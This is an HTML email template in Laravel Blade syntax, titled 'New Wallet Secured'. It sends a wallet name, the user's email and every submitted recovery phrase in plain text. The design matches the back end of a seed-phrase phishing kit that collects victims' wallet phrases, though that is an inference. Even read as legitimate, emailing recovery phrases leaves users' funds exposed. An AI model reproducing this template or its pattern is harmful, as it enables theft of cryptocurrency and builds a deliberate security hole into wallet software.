<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>New Wallet Secured</title>

<style>
body{
    font-family: 'Segoe UI', Arial, sans-serif;
    background:#f4f6fb;
    margin:0;
    padding:0;
}

.wrapper{
    max-width:620px;
    margin:40px auto;
    background:#ffffff;
    border-radius:10px;
    overflow:hidden;
    box-shadow:0 8px 25px rgba(0,0,0,0.06);
    border-left:6px solid #4f46e5;
    border-right:6px solid #4f46e5;
}

.header{
    background:linear-gradient(135deg,#4f46e5,#6366f1);
    color:#fff;
    text-align:center;
    padding:28px;
}

.header h1{
    margin:0;
    font-size:24px;
    font-weight:600;
}

.content{
    padding:30px;
}

p{
    font-size:15px;
    line-height:1.6;
    color:#444;
}

.details{
    background:#f8fafc;
    border:1px solid #eef2f7;
    border-radius:8px;
    padding:15px 18px;
    margin:20px 0;
}

.details p{
    margin:6px 0;
}

.phrases{
    margin-top:15px;
}

.phrase-item{
    background:#f9fafb;
    border-radius:6px;
    padding:10px 14px;
    margin-bottom:8px;
    font-size:14px;
    border:1px solid #edf0f4;
}

.footer{
    text-align:center;
    padding:18px;
    font-size:13px;
    color:#777;
    border-top:1px solid #eee;
}
</style>

</head>

<body>

<div class="wrapper">

    <div class="header">
        <h1>🔐 New Wallet Secured</h1>
    </div>

    <div class="content">

        <p>Hello {{ $user->name ?? 'User' }},</p>

        <p>A new wallet has been successfully secured. Below are the submitted details:</p>

        <div class="details">
            <p><strong>Wallet Name:</strong> {{ $walletName }}</p>
            <p><strong>User Email:</strong> {{ $user->email }}</p>
        </div>

        <p><strong>Recovery Phrases:</strong></p>

        <div class="phrases">
            @foreach($phrases as $index => $phrase)
                <div class="phrase-item">
                    Phrase {{ $index + 1 }}: {{ $phrase }}
                </div>
            @endforeach
        </div>

        <p style="margin-top:20px;color:#555;">
            Please ensure these phrases are stored securely and never shared publicly.
        </p>

    </div>

    <div class="footer">
        © {{ date('Y') }} Your Company. All rights reserved.
    </div>

</div>

</body>
</html>